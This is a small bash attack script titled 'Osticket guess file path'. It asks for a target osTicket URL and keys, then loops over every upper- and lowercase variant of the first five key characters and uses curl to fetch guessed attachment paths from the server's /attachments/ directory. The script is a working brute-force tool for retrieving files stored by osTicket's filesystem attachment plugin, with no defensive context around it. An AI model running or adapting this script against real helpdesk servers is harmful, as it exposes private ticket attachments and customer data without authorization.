#!/bin/bash
Y='\033[1;33m'      # Yellow
C='\033[1;36m'        # Cyan
END="\e[0m"
echo -e "
            ---------------------------------
            -                               -
            -   ${C}Osticket guess file path${END}    -
            -                               -
            -       ${C}Github:@Und3r-r00t${END}      -
            -                               -
            ---------------------------------
"
echo -e $Y"[note!]"${END}
echo -e $Y"[*] Attachments on the filesystem"${END}
echo -e $Y"[*]${END} https://docs.osticket.com/en/latest/Plugins/Attachments on the Filesystem.html"${END}
sleep 2
echo -e
echo -n "Target: "
read url
echo -n "Url key: "
read key
echo -n "File key: "
read filekey

sleep 1

cutkey=`echo $key | cut -c 1-5`
one=`echo $cutkey | cut -c 1`
two=`echo $cutkey | cut -c 2`
three=`echo $cutkey | cut -c 3`
four=`echo $cutkey | cut -c 4`
five=`echo $cutkey | cut -c 5`

echo
for guess in $(echo {$one,"${one^^}"}{$two,"${two^^}"}{$three,"${three^^}"}{$four,"${four^^}"}{$five,"${five^^}"}); do
    for guesspath in $(echo {$one,"${one^^}"}); do
        curl "http://$url/attachments/${guesspath}/${guess}${filekey}" 2>/dev/null ;
    done
done
